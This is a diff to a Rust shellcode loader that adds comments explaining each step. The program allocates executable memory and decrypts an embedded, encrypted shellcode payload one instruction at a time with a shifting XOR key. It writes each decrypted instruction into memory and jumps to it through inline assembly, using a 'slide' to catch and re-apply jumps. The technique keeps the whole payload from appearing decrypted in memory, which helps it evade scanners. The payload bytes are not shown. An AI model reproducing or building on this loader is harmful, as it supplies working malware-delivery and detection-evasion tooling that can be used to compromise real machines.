@@ -36,10 +36,12 @@ const ALLOC_SIZE: usize =
 const CATCH_OFFSET: usize = BLOCK_SIZE + FIRST_SLIDE.len() + SLIDE_LEN * BLOCK_SIZE;
 const STACK_OFFSET: usize = BLOCK_SIZE + FIRST_SLIDE.len() + SLIDE_LEN * BLOCK_SIZE + CATCH_LEN;
 
+// decrypt key
 const KEY: [u8; BLOCK_SIZE] = [0x9f, 0x96, 0xd1, 0xef, 0x3a, 0x79, 0x98, 0x29, 0x9e, 0x8a];
 
 fn main() {
     unsafe {
+        // allocate an executable region
         let page_size = page_size::get();
         let ptr = alloc(Layout::from_size_align(ALLOC_SIZE, page_size).unwrap());
         mprotect(
@@ -50,7 +52,7 @@ fn main() {
 
         let slice = core::slice::from_raw_parts_mut(ptr, STACK_OFFSET);
 
-        // setup slide
+        // setup slide (to detect jumps and "reapply" them to the instr_pointer)
         slice[BLOCK_SIZE..(BLOCK_SIZE * 2)].copy_from_slice(&FIRST_SLIDE); // ret
         for i in 2..(SLIDE_LEN + 2) {
             let start = i * BLOCK_SIZE;
@@ -72,11 +74,13 @@ fn main() {
         let mut instr_pointer = 0;
 
         loop {
+            // get the encrypted instruction bytes 
             let chunk = &SHELLCODE
                 .chunks_exact(BLOCK_SIZE)
                 .nth(instr_pointer)
                 .unwrap();
 
+            // decrypt the instruction & write it
             let key = KEY;
             for i in 0..BLOCK_SIZE {
                 slice[i] = chunk[i] ^ (key[i].wrapping_add(instr_pointer as u8));
@@ -84,6 +88,7 @@ fn main() {
 
             let mut r13: u64 = 0;
 
+            // jump on it & save registers
             asm!(
                 "call {0}",
                 "cld", // clear direction flag
